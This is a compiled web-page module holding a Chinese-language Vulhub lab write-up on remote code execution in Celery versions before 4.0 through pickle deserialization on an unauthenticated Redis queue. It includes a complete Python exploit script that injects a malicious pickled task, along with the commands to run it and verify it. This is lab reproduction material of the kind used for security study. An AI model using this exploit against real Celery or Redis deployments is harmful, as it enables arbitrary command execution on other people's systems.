import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as p,c,a as n,b as s,d as e,e as i}from"./app-58e4a7d6.js";const l={},r=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),u=n("p",null,"Celery 是一个简单、灵活且可靠的分布式系统，用于处理大量消息，同时为操作提供维护此类系统所需的工具。它是一个专注于实时处理的任务队列，同时也支持任务调度。",-1),d=n("p",null,"在Celery < 4.0版本默认使用Pickle进行任务消息的序列化传递，当所用队列服务（比如Redis、RabbitMQ、RocketMQ等等等）存在未授权访问问题时，可利用Pickle反序列化漏洞执行任意代码。",-1),k=n("p",null,"参考阅读：",-1),b={href:"https://docs.celeryproject.org/en/stable/userguide/configuration.html",target:"_blank",rel:"noopener noreferrer"},m={href:"https://www.bookstack.cn/read/celery-3.1.7-zh/8d5b10e3439dbe1f.md#dhfmrk",target:"_blank",rel:"noopener noreferrer"},h={href:"https://docs.celeryproject.org/en/stable/userguide/calling.html#serializers",target:"_blank",rel:"noopener noreferrer"},_={href:"https://www.jianshu.com/p/52552c075bc0",target:"_blank",rel:"noopener noreferrer"},g={href:"https://www.runoob.com/w3cnote/python-redis-intro.html",target:"_blank",rel:"noopener noreferrer"},v={href:"https://blog.csdn.net/SKI_12/article/details/85015803",target:"_blank",rel:"noopener noreferrer"},A=i(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动Celery 3.1.23 + Redis：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>漏洞利用脚本<code>exploit.py</code>仅支持在python3下使用</p><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> pickle
<span class="token keyword">import</span> json
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> redis
<span class="token keyword">import</span> sys
r <span class="token operator">=</span> redis<span class="token punctuation">.</span>Redis<span class="token punctuation">(</span>host<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">,</span> decode_responses<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>db<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>

ori_str<span class="token operator">=</span><span class="token string">&quot;{\\&quot;content-type\\&quot;: \\&quot;application/x-python-serialize\\&quot;, \\&quot;properties\\&quot;: {\\&quot;delivery_tag\\&quot;: \\&quot;16f3f59d-003c-4ef4-b1ea-6fa92dee529a\\&quot;, \\&quot;reply_to\\&quot;: \\&quot;9edb8565-0b59-3389-944e-a0139180a048\\&quot;, \\&quot;delivery_mode\\&quot;: 2, \\&quot;body_encoding\\&quot;: \\&quot;base64\\&quot;, \\&quot;delivery_info\\&quot;: {\\&quot;routing_key\\&quot;: \\&quot;celery\\&quot;, \\&quot;priority\\&quot;: 0, \\&quot;exchange\\&quot;: \\&quot;celery\\&quot;}, \\&quot;correlation_id\\&quot;: \\&quot;6e046b48-bca4-49a0-bfa7-a92847216999\\&quot;}, \\&quot;headers\\&quot;: {}, \\&quot;content-encoding\\&quot;: \\&quot;binary\\&quot;, \\&quot;body\\&quot;: \\&quot;gAJ9cQAoWAMAAABldGFxAU5YBQAAAGNob3JkcQJOWAQAAABhcmdzcQNLZEvIhnEEWAMAAAB1dGNxBYhYBAAAAHRhc2txBlgJAAAAdGFza3MuYWRkcQdYAgAAAGlkcQhYJAAAADZlMDQ2YjQ4LWJjYTQtNDlhMC1iZmE3LWE5Mjg0NzIxNjk5OXEJWAgAAABlcnJiYWNrc3EKTlgJAAAAdGltZWxpbWl0cQtOToZxDFgGAAAAa3dhcmdzcQ19cQ5YBwAAAHRhc2tzZXRxD05YBwAAAHJldHJpZXNxEEsAWAkAAABjYWxsYmFja3NxEU5YBwAAAGV4cGlyZXNxEk51Lg==\\&quot;}&quot;</span>
task_dict <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>ori_str<span class="token punctuation">)</span>
command <span class="token operator">=</span> <span class="token string">&#39;touch /tmp/celery_success&#39;</span>
<span class="token keyword">class</span> <span class="token class-name">Person</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 未导入os模块，通用</span>
        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">&#39;os&#39;</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">,</span> <span class="token punctuation">(</span>command<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
pickleData <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>Person<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
task_dict<span class="token punctuation">[</span><span class="token string">&#39;body&#39;</span><span class="token punctuation">]</span><span class="token operator">=</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>pickleData<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>task_dict<span class="token punctuation">)</span>
r<span class="token punctuation">.</span>lpush<span class="token punctuation">(</span><span class="token string">&#39;celery&#39;</span><span class="token punctuation">,</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>task_dict<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>pip install redis
python exploit.py [主机IP]
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011049883.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>查看结果：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose logs celery
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可以看到如下任务消息报错：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011048739.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose exec celery ls -l /tmp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可以看到成功创建了文件<code>celery_success</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202203011048652.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,15);function y(f,q){const a=o("ExternalLinkIcon");return p(),c("div",null,[r,u,d,k,n("ul",null,[n("li",null,[n("a",b,[s("https://docs.celeryproject.org/en/stable/userguide/configuration.html"),e(a)])]),n("li",null,[n("a",m,[s("https://www.bookstack.cn/read/celery-3.1.7-zh/8d5b10e3439dbe1f.md#dhfmrk"),e(a)])]),n("li",null,[n("a",h,[s("https://docs.celeryproject.org/en/stable/userguide/calling.html#serializers"),e(a)])]),n("li",null,[n("a",_,[s("https://www.jianshu.com/p/52552c075bc0"),e(a)])]),n("li",null,[n("a",g,[s("https://www.runoob.com/w3cnote/python-redis-intro.html"),e(a)])]),n("li",null,[n("a",v,[s("https://blog.csdn.net/SKI_12/article/details/85015803"),e(a)])])]),A])}const j=t(l,[["render",y],["__file","Celery 4.0 Redis未授权访问_Pickle反序列化利用.html.vue"]]);export{j as default};
